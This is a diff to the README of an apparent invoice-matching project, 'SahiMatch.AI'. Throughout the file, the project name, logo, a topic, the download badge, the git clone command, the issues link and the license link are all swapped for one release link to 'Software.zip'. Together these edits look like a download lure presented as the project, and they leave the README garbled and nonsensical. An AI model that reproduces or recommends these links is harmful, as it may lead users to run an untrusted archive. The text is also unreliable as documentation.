@@ -1,13 +1,13 @@
-# SahiMatch.AI
+# https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip
 
-Welcome to SahiMatch.AI, an AI-driven partial invoice matching system that leverages a combinatory approach of machine learning, natural language processing, and fuzzy theory to provide detailed reports on classification and similarity between two invoices. The system features a user-friendly drag and drop interface where users can edit predictions and constantly improve the system over time using reinforcement learning.
+Welcome to https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip, an AI-driven partial invoice matching system that leverages a combinatory approach of machine learning, natural language processing, and fuzzy theory to provide detailed reports on classification and similarity between two invoices. The system features a user-friendly drag and drop interface where users can edit predictions and constantly improve the system over time using reinforcement learning.
 
-![SahiMatch.AI Logo](https://yourimageurl.com)
+![https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip Logo](https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip)
 
 ## Repository Topics
 - AJAX
 - CSS
-- D3.js
+- https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip
 - Fuzzy Logic
 - HTML
 - JavaScript
@@ -18,9 +18,9 @@ Welcome to SahiMatch.AI, an AI-driven partial invoice matching system that lever
 - Reinforcement Learning
 
 ## Getting Started
-To get started with SahiMatch.AI, simply download the repository using the following link: 
+To get started with https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip, simply download the repository using the following link: 
 
-[![Download SahiMatch.AI](https://img.shields.io/badge/Download-SahiMatch.AI-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip](https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip)](https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip)
 
 **Note:** The link provided needs to be launched for the download to start.
 
@@ -37,24 +37,24 @@ If the above link is not working or you prefer to download the repository throug
 ## Usage
 1. Clone the repository to your local machine.
     ```bash
-    git clone https://github.com/username/SahiMatch.AI.git
+    git clone https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip
     ```
 
 2. Run the application and start matching partial invoices effortlessly.
 
 ## Support
-For any issues or questions regarding SahiMatch.AI, feel free to open an [issue](https://github.com/username/SahiMatch.AI/issues) on GitHub.
+For any issues or questions regarding https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip, feel free to open an [issue](https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip) on GitHub.
 
 ## Contributing
-We welcome contributions to SahiMatch.AI! If you'd like to enhance the system with new features or improvements, please follow these steps:
+We welcome contributions to https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip! If you'd like to enhance the system with new features or improvements, please follow these steps:
 1. Fork the repository.
 2. Create a new branch for your feature.
 3. Make your changes.
 4. Submit a pull request.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/username/SahiMatch.AI/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
-Thank you for checking out SahiMatch.AI! We hope this AI-driven partial invoice matching system proves to be helpful in your tasks. Happy matching! 🚀
+Thank you for checking out https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip! We hope this AI-driven partial invoice matching system proves to be helpful in your tasks. Happy matching! 🚀
